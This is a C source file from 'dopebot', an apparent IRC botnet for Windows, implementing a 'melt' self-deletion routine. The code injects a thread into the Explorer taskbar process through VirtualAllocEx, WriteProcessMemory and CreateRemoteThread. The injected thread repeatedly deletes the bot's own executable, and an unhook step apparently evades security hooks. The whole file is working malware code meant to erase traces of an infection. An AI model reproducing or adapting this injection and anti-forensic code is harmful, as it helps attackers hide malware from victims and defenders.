/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_MELT
#include "bot.h"

//This Function Marks The Memory Address After RemoteThread, Its Used To Count The Size Of RemoteThread
void calcthread(void) 
{
}

//Remote Function
DWORD WINAPI remotethread(INJDATA *rData)
{
	bool b = FALSE;
	while (!b)
	{
		if (rData->fnDeleteFile(rData->lpFileName)) b = TRUE;
			rData->fnSleep(rData->dwMilliseconds);
	}
		return 0;
}

//Inject Melt Code
bool melt()
{
	char szFileName[MAX_PATH];
	DWORD dwBytesWritten, dwPID, dwThreadId, *rRemoteCode; 
	HANDLE hProcess, hThread = NULL;
	INJDATA *rRemoteData;
	int cbCodeSize;

#ifndef NO_DEBUG
		printf("[DEBUG] Hooking melt, melt()...\n");
#endif

#ifndef NO_UNHOOK
		unhook_functions();
#endif

		GetWindowThreadProcessId(FindWindow("shell_traywnd", NULL), &dwPID);
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
	if (hProcess == NULL) return FALSE;
		GetModuleFileName(GetModuleHandle(NULL), szFileName, MAX_PATH);
	INJDATA DataLocal = 
	{
			(DELETEFILE)GetProcAddress(GetModuleHandle(__TEXT("KERNEL32")), "DeleteFileA"),
			(SLEEP)GetProcAddress(GetModuleHandle(__TEXT("KERNEL32")), "Sleep"),
	};
		sprintf(DataLocal.lpFileName, szFileName);
		DataLocal.dwMilliseconds = 500;
		rRemoteData = (INJDATA*)xVirtualAllocEx(hProcess, 0, sizeof(INJDATA), MEM_COMMIT, PAGE_READWRITE);
	if (!rRemoteData) return FALSE;
	if (!WriteProcessMemory(hProcess, rRemoteData, &DataLocal, sizeof(INJDATA), &dwBytesWritten)) return FALSE;
		cbCodeSize = ((LPBYTE)calcthread - (LPBYTE)remotethread);
		rRemoteCode = (PDWORD)xVirtualAllocEx(hProcess, 0, cbCodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	if (!rRemoteCode) return FALSE;
	if (!WriteProcessMemory(hProcess, rRemoteCode, &remotethread, cbCodeSize, &dwBytesWritten)) return FALSE;
		hThread = xCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rRemoteCode, rRemoteData, 0 , &dwThreadId);
	if (!hThread) return FALSE;
		WaitForSingleObject(hThread, 1000);
		xVirtualFreeEx(hProcess, rRemoteData, 0, MEM_RELEASE);
		xVirtualFreeEx(hProcess, rRemoteCode, 0, MEM_RELEASE);
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return TRUE;
}
#endif